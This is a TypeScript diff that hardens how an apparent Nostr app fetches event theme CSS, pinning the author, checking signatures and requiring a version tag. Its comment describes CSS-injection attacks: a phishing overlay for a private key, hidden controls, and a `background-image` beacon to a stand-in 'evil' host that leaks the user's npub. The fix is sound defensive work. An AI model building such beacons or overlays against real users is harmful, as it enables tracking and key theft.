@@ -11,8 +11,11 @@ import {
   hexToBytes,
   utf8ByteLength,
   MAX_THEME_CSS_BYTES,
+  pickLatest,
+  hasCurrentVersionTag,
 } from "@nostrautica/protocol";
 import { fetchEvents } from "$lib/nostr/ndk.js";
+import { onlyVerified, onlyByAuthors } from "$lib/nostr/verify.js";
 import { publishMonotonic } from "$lib/nostr/monotonic.js";
 import { toOutcome, type PublishOutcome } from "$lib/nostr/publish-queue.js";
 import { loadEventKeys } from "./keystore.js";
@@ -37,7 +40,30 @@ export async function fetchEventTheme(ctx: EventContext): Promise<string | undef
     { kinds: [KIND_EVENT_THEME], authors: [pubkey], "#d": [identifier] },
     ctx.config.relays,
   );
-  const latest = events.sort((a, b) => (b.created_at ?? 0) - (a.created_at ?? 0))[0];
+  // Authority boundary: `authors` in the filter above is a REQUEST, not a
+  // guarantee — nothing stops a relay in the event's set from answering it with a
+  // validly-signed 31609 authored by any key it likes. This content is not data
+  // the app renders; theme-injector.ts puts it verbatim into a <style> element in
+  // <head>, so an unpinned read hands any one of the event's relays a stylesheet
+  // over the whole app shell: a fixed-position overlay that phishes for an nsec,
+  // `display:none` on the controls a reader needs to leave a room, relabelled
+  // buttons, or a `background-image: url(https://evil/…?npub=…)` beacon (the CSP's
+  // img-src allows any https origin). E_id is the ONLY valid author of a 31609,
+  // so pin it here the same way every other authority read does (see attendee.ts
+  // `fetchRoster`), and pick the winner with the §3.1 rule (created_at, then
+  // LOWEST id) rather than an ad-hoc sort that leaves same-second ties to
+  // arrival order.
+  //
+  // Wire version (NIP §2): a reader of a public custom kind MUST ignore an event
+  // whose `v` tag is absent or ≠ "2". 31609 is the kind where that matters most,
+  // and the only one that had no version check at all: its content is RAW CSS
+  // with no payload schema, so unlike every other public kind there is no `"v": 2`
+  // inside to reject on — the tag is the entire version signal. Without this,
+  // a v1 theme (or a v3 one written against semantics this build predates) is
+  // injected verbatim into <head> and styles the whole app shell.
+  const latest = pickLatest(
+    onlyByAuthors(onlyVerified(events), [pubkey]).filter((e) => hasCurrentVersionTag(e.tags)),
+  );
   const css = latest?.content ?? "";
   const valid = css.trim() && utf8ByteLength(css) <= MAX_THEME_CSS_BYTES;
   // Write-through: cache the CSS (or "" for "no theme") so the next entry paints
@@ -56,7 +82,7 @@ export async function publishEventTheme(ctx: EventContext, css: string): Promise
   const bytes = utf8ByteLength(css);
   if (bytes > MAX_THEME_CSS_BYTES) {
     throw new Error(
-      `theme CSS is ${bytes} bytes — the limit is ${MAX_THEME_CSS_BYTES}`,
+      `theme CSS is ${bytes} bytes, over the ${MAX_THEME_CSS_BYTES}-byte limit`,
     );
   }
   const keys = await loadEventKeys(ctx.coordinate);
